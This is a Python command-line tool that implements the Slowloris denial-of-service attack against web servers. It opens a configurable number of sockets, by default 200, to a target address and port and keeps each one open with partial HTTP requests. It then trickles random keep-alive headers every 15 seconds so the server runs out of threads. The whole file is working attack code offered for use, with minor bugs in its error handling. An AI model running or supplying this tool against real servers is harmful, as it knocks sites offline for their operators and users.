#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
This is a simple python implementation of slow loris attack.
Slow Loris only works on Apache servers, since it pops a thread for every new
client.
"""

import time
import socket
import random
import argparse
import ipaddress


#Headers to be sent at the beginning of the connection
HEADERS = [
    b"User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64;\
      rv:49.0) Gecko/20100101 Firefox/49.0",
    b"Accept-language: en-US,en,q=0.5",
]

def socket_error(sock):
    """ Handles a socket error: kill the socket. """
    print("Socket error, killing socket")
    sock.close()
    sock = None
    return sock


def init_socket(socket_tuple):
    """ Inits a socket and sends the first headers. It also sends the start
    of the request.
    """
    sock = socket.socket(socket_tuple[0], socket_tuple[1], socket_tuple[2])
    sock.settimeout(15)
    sock.connect(socket_tuple[4])

    if sock:
        try:
            sock.send(b"GET /?%d HTTP/1.1\r\n" %random.randint(0,5000))
            for header in HEADERS:
                sock.send(header)
        except sock.error:
                sock = socket_error()
    return sock

def send_header(sock):
    """ Sends a chunk of header to the server to keep it waiting.
    """
    if sock:
        try:
            value = random.randint(1,5000)
            sock.send(b"X-a: %d\r\n" % value)
        except socket.error as error:
            print("Socket error:\n%s\n killing socket" % error)
            sock.close()
            LIST_OF_SOCKETS.remove(sock)

def slow_loris(socket_tuple, sock_number):
    """ Implements the attack. Creates the given number of sockets, and manages
    it, recreating socket if necessary.
    It assumes that the ip is not none, and that sock_number is a positive
    number.
    """
    for _ in range(sock_number):
        sock = init_socket(socket_tuple)
        if sock:
            LIST_OF_SOCKETS.append(sock)
            print("Created socket %d" % len(LIST_OF_SOCKETS))

    while True:
        print("Sending keep-alive headers."
              "Remaining sockets: %d" % len(LIST_OF_SOCKETS)
        )
        for sock in LIST_OF_SOCKETS:
            send_header(sock)
        for _ in range(sock_number - len(LIST_OF_SOCKETS)):
            sock = init_socket(socket_tuple)
            if sock:
                LIST_OF_SOCKETS.append(sock)
                print("Recreating socket...")
        time.sleep(15)
    return 0



def validate_args(args):
    """ Checks if the arguments are valid or not. """
    # Is the number of sockets positive ?
    if not args.number > 0:
        print("[ERROR] Number of sockets should be positive. Received %d" % args.number)
        exit(1)
    # Is a valid IP address or valid name ?
    try:
        servers = socket.getaddrinfo(args.address, args.port, proto=socket.IPPROTO_TCP)
        return servers[0]
    except socket.gaierror as error:
        print(error)
        print("Please, provide a valid IPv4, IPv6 address or a valid domain name.")
        exit(1)


if __name__ == "__main__":

    # Manages the list of sockets
    LIST_OF_SOCKETS = []

    DESCRIPTION = "Attacks the web server at the given IP \
                   with the Slow Loris attack"
    PARSER = argparse.ArgumentParser(description=DESCRIPTION)
    PARSER.add_argument(
        "address",
        type=str,
        action="store",
        metavar="ADDRESS",
        help="The address or hostname to attack",
    )
    PARSER.add_argument(
        "-n", "--number",
        help="Number of sockets to open (default=200)",
        action="store",
        type=int,
        default=200,
    )
    PARSER.add_argument(
        "-p", "--port",
        help="Port to attack",
        action="store",
        type=int,
        default=80,
    )
    ARGS = PARSER.parse_args()
    socket_tuple = validate_args(ARGS)
    slow_loris(socket_tuple, ARGS.number)
